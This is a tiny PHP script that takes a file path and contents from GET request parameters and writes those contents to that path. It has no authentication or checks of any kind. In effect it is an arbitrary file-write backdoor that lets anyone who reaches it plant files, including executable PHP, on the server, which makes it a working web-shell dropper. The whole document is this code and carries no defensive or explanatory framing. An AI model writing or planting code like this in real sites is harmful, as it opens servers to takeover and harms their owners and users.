<?php
$filepath = "";
$control = "";

  if(!empty($_GET['path'])){
    $filepath = $_GET['path'];
  }
  if(!empty($_GET['put'])){
    $control = $_GET['put'];
  }

$file = fopen($filepath, "w") or die("can't open file");
fwrite($file,$control);
fclose($file);

?>
